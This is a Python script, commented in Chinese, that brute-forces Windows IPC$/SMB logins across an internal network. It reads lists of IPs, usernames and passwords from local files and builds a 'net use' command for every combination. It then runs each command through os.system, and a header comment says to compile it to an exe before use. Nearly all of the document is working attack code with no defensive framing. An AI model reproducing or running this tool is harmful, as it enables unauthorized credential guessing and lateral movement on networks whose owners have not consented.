# 使用的时候转成exe文件
import os, time, threading

ip_line = []
username_line = []
password_line = []
system_line = []


def read_ip():
    for ip in open('D:/工具/脚本/fuzz/ip.txt'):
        ip = ip.replace("\n", "")
        ip_line.append(ip)


def read_username():
    for username in open('D:/工具/脚本/fuzz/username.txt'):
        username = username.replace("\n", "")
        username_line.append(username)


def read_password():
    for password in open('D:/工具/脚本/fuzz/password.txt'):
        password = password.replace("\n", "")
        password_line.append(password)


def yu_r():
    for ip in ip_line:
        for username in username_line:
            for password in password_line:
                exec = "net use \\" + "\\" + ip + '\ipc$ ' + password + ' /user:god\\' + username
                print('--->' + exec + '<---')
                system_line.append(exec)


def yu(ip):
    for username in username_line:
        for password in password_line:
            exec = "net use \\" + "\\" + ip + '\ipc$ ' + password + ' /user:god\\' + username
            print('--->' + exec + '<---')
            system_line.append(exec)


def system_use():
    for exec in system_line:
        os.system(exec)
        time.sleep(1)


def thread_r():
    threads = []
    t1 = threading.Thread(target=read_ip)
    threads.append(t1)
    t2 = threading.Thread(target=read_username)  # 创建第一个子线程，子线程任务是调用task1函数，函数名后面没有（）
    threads.append(t2)
    t3 = threading.Thread(target=read_password)
    threads.append(t3)
    t4 = threading.Thread(target=yu_r)
    threads.append(t4)
    t5 = threading.Thread(target=system_use)
    threads.append(t5)
    for t in threads:  # 遍历线程列表
        t.daemon = True  # 将线程声明为守护线程，必须在start方法调用之前设置，如果不设置守护线程程序会无线挂起
        t.start()
        t.join()


def thread(ip):
    print("正在进行内网账号密码爆破，请先确保协议可用\n")
    threads = []
    t1 = threading.Thread(target=read_username)  # 创建第一个子线程，子线程任务是调用task1函数，函数名后面没有（）
    threads.append(t1)
    t2 = threading.Thread(target=read_password)
    threads.append(t2)
    t3 = threading.Thread(target=yu, args=(ip,))
    threads.append(t3)
    t4 = threading.Thread(target=system_use)
    threads.append(t4)
    for t in threads:  # 遍历线程列表
        t.daemon = True  # 将线程声明为守护线程，必须在start方法调用之前设置，如果不设置守护线程程序会无线挂起
        t.start()
        t.join()
